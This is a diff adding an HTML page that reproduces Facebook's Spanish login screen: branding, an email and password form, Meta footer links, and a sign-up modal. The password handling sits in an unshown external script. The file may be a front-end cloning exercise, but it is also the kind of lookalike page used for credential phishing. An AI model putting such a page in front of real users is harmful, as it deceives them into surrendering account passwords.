@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        <div class="right">
+            <form id="login-form">
+                <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" id="password" placeholder="Contraseña" required>
+                <input type="submit" value="Iniciar sesión">
+                <a href="recuperar.html">¿Olvidaste tu contraseña?</a>
+                <hr>
+                <button type="button" class="create-account" onclick="mostrarModal()">Crear cuenta nueva</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-inner">
+            <div class="language-links">
+                <a href="#">Español</a> ·
+                <a href="#">English (US)</a> ·
+                <a href="#">Português (Brasil)</a> ·
+                <a href="#">Français (France)</a> ·
+                <a href="#">Italiano</a> ·
+                <a href="#">Deutsch</a> ·
+                <a href="#">العربية</a> ·
+                <a href="#">हिन्दी</a> ·
+                <a href="#">中文(简体)</a>
+            </div>
+            <hr>
+            <div class="footer-links">
+                <a href="#">Registrarte</a> ·
+                <a href="#">Iniciar sesión</a> ·
+                <a href="#">Messenger</a> ·
+                <a href="#">Facebook Lite</a> ·
+                <a href="#">Watch</a> ·
+                <a href="#">Lugares</a> ·
+                <a href="#">Juegos</a> ·
+                <a href="#">Marketplace</a> ·
+                <a href="#">Meta Pay</a> ·
+                <a href="#">Meta Store</a> ·
+                <a href="#">Meta Quest</a> ·
+                <a href="#">Meta AI</a> ·
+                <a href="#">Recaducaciones de fondos</a> ·
+                <a href="#">Servicios</a> ·
+                <a href="#">Centro de información de votación</a> ·
+                <a href="#">Política de privacidad</a> ·
+                <a href="#">Centro de privacidad</a> ·
+                <a href="#">Grupos</a> ·
+                <a href="#">Información</a> ·
+                <a href="#">Crear anuncio</a> ·
+                <a href="#">Crear página</a> ·
+                <a href="#">Desarrolladores</a> ·
+                <a href="#">Empleo</a> ·
+                <a href="#">Cookies</a> ·
+                <a href="#">Opciones de anuncios</a> ·
+                <a href="#">Condiciones</a> ·
+                <a href="#">Ayuda</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Contenedor del modal -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal">
+            <iframe src="account.html" frameborder="0"></iframe>
+            <button type="button" onclick="cerrarModal()">Cerrar</button>
+        </div>
+    </div>
+
+    <script src="../js/scripts.js"></script>
+</body>
+</html>
